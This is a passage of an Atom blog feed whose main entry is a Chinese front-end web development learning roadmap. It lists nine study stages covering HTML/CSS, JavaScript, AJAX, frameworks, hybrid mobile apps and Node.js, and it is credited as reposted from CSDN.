      <category term="随笔" scheme="http://dangoying.ink/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="http://dangoying.ink/tags/%E9%9A%8F%E7%AC%94/"/>
    
      <category term="心情" scheme="http://dangoying.ink/tags/%E5%BF%83%E6%83%85/"/>
    
      <category term="生活" scheme="http://dangoying.ink/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>前端学习路线</title>
    <link href="http://dangoying.ink/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF.html"/>
    <id>http://dangoying.ink/前端学习路线.html</id>
    <published>2018-03-28T11:39:59.000Z</published>
    <updated>2018-03-30T12:31:47.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一阶段："><a href="#第一阶段：" class="headerlink" title="第一阶段："></a>第一阶段：</h2><ul><li>HTML+CSS：<br>HTML进阶、CSS进阶、div+css布局、HTML+css整站开发。</li><li>JavaScript基础：<br>Js基础教程、js内置对象常用方法、常见DOM树操作大全、ECMAscript、DOM、BOM、定时器和焦点图。</li><li>JS基本特效：<br>常见特效、例如：tab、导航、整页滚动、轮播图、JS制作幻灯片、弹出层、手风琴菜单、瀑布流布局、滚动事件、滚差视图。<a id="more"></a></li><li>JS高级特征：<br>正则表达式、排序算法、递归算法、闭包、函数节流、作用域链、基于距离运动框架、面向对象基础。</li><li>JQuery：<br>悬着器、DOM操作、特效和动画、方法链、拖拽、变形、JQueryUI组件基本使用。</li></ul><h2 id="第二阶段：HTML5和移动Web开发"><a href="#第二阶段：HTML5和移动Web开发" class="headerlink" title="第二阶段：HTML5和移动Web开发"></a>第二阶段：HTML5和移动Web开发</h2><ul><li>HTML5：<br>HTML5新语义标签、HTML5表单、音频和视频、离线和本地存储、SVG、Web Socket、Canvas。</li><li>CSS3：<br>CSS3新选择器、伪元素、脸色表示法、边框、阴影、background系列属性改变、Transition、动画、景深和深透、3D效果制作、Velocity.js框架、元素进场、出场策略、炫酷CSS3网页制作。</li><li>Bootstrap:<br>响应式概念、媒体查询、响应式网站制作、删格系统、删格系统原理、Bootstrap常用模板、LESS和SASS。</li><li>移动Web开发：<br>跨终端WEB和主流设备简介、视口、流式布局、弹性盒子、rem、移动终端JavaScript事件、手机中常见JS效果制作、Zepto.js、手机聚划算页面、手机滚屏。</li></ul><h2 id="第三阶段：HTTP服务和AJAX编程"><a href="#第三阶段：HTTP服务和AJAX编程" class="headerlink" title="第三阶段：HTTP服务和AJAX编程"></a>第三阶段：HTTP服务和AJAX编程</h2><ul><li>WEB服务器基础：<br>服务器基础知识、Apache服务器和其他WEB服务器介绍、Apache服务器搭建、HTTP介绍。</li><li>PHP基础：<br>PHP基础语法、使用PHP处理简单的GET或者POST请求。</li><li>AJAX上篇：<br>Ajax简介和异步的概念、Ajax框架的封装、XMLHttpRequest对象详细介绍方法、兼容性处理方法、Ajax框架的封装、Ajax中缓存问题、XML介绍和使用。</li><li>AJAX下篇：<br>JSON和JSON解析、数据绑定和模板技术、JSONP、跨域技术、图片预读取和lazy-load技术、JQuery框架中的AjaxAPI、使用Ajax实现爆布流案例额。</li></ul><h2 id="第四阶段：HTTP服务和AJAX编程"><a href="#第四阶段：HTTP服务和AJAX编程" class="headerlink" title="第四阶段：HTTP服务和AJAX编程"></a>第四阶段：HTTP服务和AJAX编程</h2><ul><li>面向对象终极篇：<br>从内存角度到理解JS面向对象、基本类型、复杂类型、原型链、ES6中的面向对象、属性读写权限、设置器、访问器。</li><li>面向对象三大特征：<br>继承性、多态性、封装性、接口。</li><li>设计模式：<br>面向对象编程思维、单例模式、工厂模式、策略模式、观察者模式、模板方法模式、代理模式、装饰者模式、适配器模式、面向切面编程。</li></ul><h2 id="第五阶段：封装一个属于自己的框架"><a href="#第五阶段：封装一个属于自己的框架" class="headerlink" title="第五阶段：封装一个属于自己的框架"></a>第五阶段：封装一个属于自己的框架</h2><ul><li>框架封装基础：<br>事件流、冒泡、捕获、事件对象、事件框架、选择框架。</li><li>框架封装中级：<br>运动原理、单物体运动框架、多物体运动框架、运动框架面向对象封装。</li><li>框架封装高级和补充：<br>JQuery框架雏形、可扩展性、模块化、封装属于传智自己的框架。</li></ul><h2 id="第六阶段：模块化组件开发"><a href="#第六阶段：模块化组件开发" class="headerlink" title="第六阶段：模块化组件开发"></a>第六阶段：模块化组件开发</h2><ul><li>面向组件编程：<br>面向组件编程的方式、面向组件编程的实现原理、面向组件编程实战、基于组件化思想开发网站应用程序。</li><li>面向模块编程：<br>AMD设计规范、CMD设计规范、RequireJS，LoadJS、淘宝的SeaJS。</li></ul><h2 id="第七阶段：主流的流行框架"><a href="#第七阶段：主流的流行框架" class="headerlink" title="第七阶段：主流的流行框架"></a>第七阶段：主流的流行框架</h2><ul><li>Web开发工作流：<br>GIT/SVN、Yeoman脚手架、NPM/Bower依赖管理工具、Grunt/Gulp/Webpack。</li><li>MVC/MVVM/MVW框架：<br>Angular.js、Backbone.js、Knockout/Ember。</li><li>常用库：<br>React.js、Vue.js、Zepto.js。</li></ul><h2 id="第八阶段：HTML5原生移动应用开发"><a href="#第八阶段：HTML5原生移动应用开发" class="headerlink" title="第八阶段：HTML5原生移动应用开发"></a>第八阶段：HTML5原生移动应用开发</h2><ul><li>Cordova：<br>WebApp/NativeApp/HybirdApp简介、Cordova简介、与PhoneGap之间的关系、开发环境搭建、Cordova实战（创建项目，配置，编译，调试，部署发布）。</li><li>Ionic：<br>Ionic简介和同类对比、模板项目解析、常见组件及使用、结合Angular构建APP、常见效果（下拉刷新，上拉加载，侧滑导航，选项卡）。</li><li>React Native：<br>React Native简介、React Native环境配置、创建项目，配置，编译，调试，部署发布、原生模块和UI组件、原生常用API。</li><li>HTML5+：<br>HTML5+中国产业联盟、HTML5 Plus Runtime环境、HBuilder开发工具、MUI框架、H5+开发和部署。</li></ul><h2 id="第九阶段：Node-js全栈开发"><a href="#第九阶段：Node-js全栈开发" class="headerlink" title="第九阶段：Node.js全栈开发"></a>第九阶段：Node.js全栈开发</h2><ul><li>快速入门：<br>Node.js发展、生态圈、Io.js、Linux/Windows/OS X环境配置、REPL环境和控制台程序、异步编程，非阻塞I/O、模块概念，模块管理工具、开发流程，调试，测试。</li><li>核心模块和对象：<br>全局对象global，process，console，util、事件驱动，事件发射器、加密解密，路径操作，序列化和反序列化、文件流操作、HTTP服务端与客户端、Socket.IO。</li><li>Web开发基础：<br>HTTP协议，请求响应处理过程、关系型数据库操作和数据访问、非关系型数据库操作和数据访问、原生的Node.js开发Web应用程序、Web开发工作流、Node.js开发Blog案例。</li><li>快速开发框架：<br>Express简介+MVC简介、Express常用API、Express路由模块、Jade/Ejs模板引擎、使用Express重构Blog案例、Koa等其他常见MVC框架。</li><li>Node.js开发电子商务实战：<br>需求与设计、账户模块注册登录、会员中心模块、前台展示模块、购物车，订单结算、在线客服即时通讯模块。</li></ul><p>转自:<a href="https://blog.csdn.net/u011047006/article/details/52597178" target="_blank" rel="noopener">https://blog.csdn.net/u011047006/article/details/52597178</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;第一阶段：&quot;&gt;&lt;a href=&quot;#第一阶段：&quot; class=&quot;headerlink&quot; title=&quot;第一阶段：&quot;&gt;&lt;/a&gt;第一阶段：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;HTML+CSS：&lt;br&gt;HTML进阶、CSS进阶、div+css布局、HTML+css整站开发。&lt;/li&gt;
&lt;li&gt;JavaScript基础：&lt;br&gt;Js基础教程、js内置对象常用方法、常见DOM树操作大全、ECMAscript、DOM、BOM、定时器和焦点图。&lt;/li&gt;
&lt;li&gt;JS基本特效：&lt;br&gt;常见特效、例如：tab、导航、整页滚动、轮播图、JS制作幻灯片、弹出层、手风琴菜单、瀑布流布局、滚动事件、滚差视图。
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
</feed>
